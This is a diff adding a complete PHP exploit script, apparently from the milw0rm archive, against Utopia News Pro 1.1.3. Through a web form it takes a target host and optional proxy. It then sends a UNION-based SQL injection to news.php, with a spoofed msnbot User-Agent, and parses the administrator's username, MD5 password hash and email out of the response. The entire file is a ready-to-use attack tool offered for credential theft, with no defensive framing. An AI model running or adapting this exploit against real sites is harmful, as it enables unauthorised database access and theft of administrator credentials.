@@ -1,0 +1,164 @@
+<?php
+#   b)if magic quotes off ->SQL INJECTION: /str0ke
+# 
+#   3.10 07/10/2005                                                            #
+#   utopia_xpl.php                                                             #
+#                                                                              #
+#   Utopia News Pro 1.1.3 (possibly prior versions) SQL Injection /            #
+#   Administrative  credentials disclosure                                     #
+#                                by rgod                                       #
+#                      site: http://rgod.altervista.org                        #
+#                                                                              #
+#   make these changes in php.ini if you have troubles                         #
+#   to launch this script:                                                     #
+#   allow_call_time_pass_reference = on                                        #
+#   register_globals = on                                                      #
+#                                                                              #
+#   usage: launch this script from Apache, fill requested fields, then         #
+#   ... grab admin MD5 passowrd hash right now                                 #
+#                                                                              #
+#   Sun-Tzu: "All warfare is based on deception"                               #
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout", 2);
+ob_implicit_flush (1);
+
+echo'<head><title> Utopia  News  Pro  1.1.3  SQL Injection         </title><meta
+http-equiv="Content-Type"  content="text/html; charset=iso-8859-1"> <style type=
+"text/css"> <!-- body,td,th {color:  #00FF00;} body {background-color: #000000;}
+.Stile5 {font-family: Verdana, Arial, Helvetica,  sans-serif; font-size: 10px; }
+.Stile6 {font-family: Verdana, Arial, Helvetica, sans-serif; font-weight:  bold;
+font-style: italic; } --> </style></head> <body> <p class="Stile6">  Utopia News
+Pro  1.1.3  SQL Injection</p>              <p class="Stile6">a script by rgod at
+<a href="http://rgod.altervista.org"  target="_blank">http://rgod.altervista.org
+</a></p><table width="84%"><tr><td width="43%"> <form name="form1" method="post"
+action="'.$SERVER[PHP_SELF].'?path=value&host=value&port=value&proxy=value"> <p>
+<input type="text" name="host"><span class="Stile5">hostname (ex: www.sitename.c
+om)  </span></p><p><input type="text" name="path"><span class="Stile5">     path
+(ex: /utopia/ or just /) </span></p><p><input type="text"   name="port" >  <span
+class="Stile5">specify a port other than 80 (default value) </span></p><p><input
+ type="text" name="proxy"> <span class="Stile5">    send exploit through an HTTP
+ proxy (ip:port) </span></p> <p> <input  type="submit"name="Submit" value="go!">
+ </p></form></td></tr></table></body></html>';
+
+function show($headeri)
+{
+$ii=0;
+$ji=0;
+$ki=0;
+$ci=0;
+echo '<table border="0"><tr>';
+while ($ii <= strlen($headeri)-1)
+{
+$datai=dechex(ord($headeri[$ii]));
+if ($ji==16) {
+             $ji=0;
+             $ci++;
+             echo "<td>&nbsp;&nbsp;</td>";
+             for ($li=0; $li<=15; $li++)
+                      { echo "<td>".$headeri[$li+$ki]."</td>";
+			    }
+            $ki=$ki+16;
+            echo "</tr><tr>";
+            }
+if (strlen($datai)==1) {echo "<td>0".$datai."</td>";} else
+{echo "<td>".$datai."</td> ";}
+$ii++;
+$ji++;
+}
+for ($li=1; $li<=(16 - (strlen($headeri) % 16)+1); $li++)
+                      { echo "<td>&nbsp&nbsp</td>";
+                       }
+
+for ($li=$ci*16; $li<=strlen($headeri); $li++)
+                      { echo "<td>".$headeri[$li]."</td>";
+			    }
+echo "</tr></table>";
+}
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacket($packet)
+{
+global $proxy, $host, $port, $html;
+if ($proxy=='')
+           {$ock=fsockopen(gethostbyname($host),$port);}
+             else
+           {
+	    if (!eregi($proxy_regex,$proxy))
+	    {echo htmlentities($proxy).' -> not a valid proxy...';
+	     die;
+	    }
+	   $parts=explode(':',$proxy);
+	    echo 'Connecting to '.$parts[0].':'.$parts[1].' proxy...<br>';
+	    $ock=fsockopen($parts[0],$parts[1]);
+	    if (!$ock) { echo 'No response from proxy...';
+			die;
+		       }
+	   }
+fputs($ock,$packet);
+if ($proxy=='')
+  {
+
+    $html='';
+    while (!feof($ock))
+      {
+        $html.=fgets($ock);
+      }
+  }
+else
+  {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html)))
+    {
+      $html.=fread($ock,1);
+    }
+  }
+fclose($ock);
+echo nl2br(htmlentities($html));
+}
+
+if (($path<>'') and ($host<>''))
+{
+if ($port=='') {$port=80;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+$sql="-1' UNION SELECT null,'20051007',username,password,null,email,null FROM unp_user WHERE userid=1 /*";
+
+#switch to this for some versions prior from 1.1.3 (different number of columns...)
+#$sql="-1' UNION SELECT null,'20051007',username,password,null,email FROM unp_user WHERE userid=1 /*";
+
+$sql=urlencode($sql);
+$packet="GET ".$p."news.php?action=printable&newsid=".$sql." HTTP/1.0 \r\n";
+$packet.="User-Agent: msnbot/1.0 (+http://search.msn.com/msnbot.htm)\r\n";
+$packet.="Accept: */*\r\n";
+$packet.="Accept-Encoding: text/plain\r\n";
+$packet.="Host: ".$host.":".$port."\r\n\r\n";
+$packet.="Connection: Close\r\n\r\n";
+show($packet);
+sendpacket($packet);
+
+# you can see hash inside html, but if version is the one I tested we can try to find it now...
+$temp=explode("<!-- PrintNews.Bit -->",$html);
+$temp2=explode("<strong>",$temp[1]);
+$temp3=explode("</strong>",$temp2[1]);
+$username=$temp3[0];
+echo '<br><br> username: '.htmlentities($username).'<br>';
+
+$temp=explode("Posted by ",$html);
+$temp2=explode("on",$temp[1]);
+$email=trim($temp2[0]);
+echo 'email: '.htmlentities($email).'<br>';
+
+$temp=explode("<!-- PrintNews.Bit -->",$html);
+$temp2=explode("<td>",$temp[1]);
+$temp3=explode("</td>",$temp2[1]);
+$hash=trim($temp3[0]);
+echo 'hash: '.htmlentities($hash).'<br>';
+}
+else
+{echo '<br>Fill requested fields, optionally specify a proxy...<br>';}
+?>
+
+# milw0rm.com [2005-10-06]
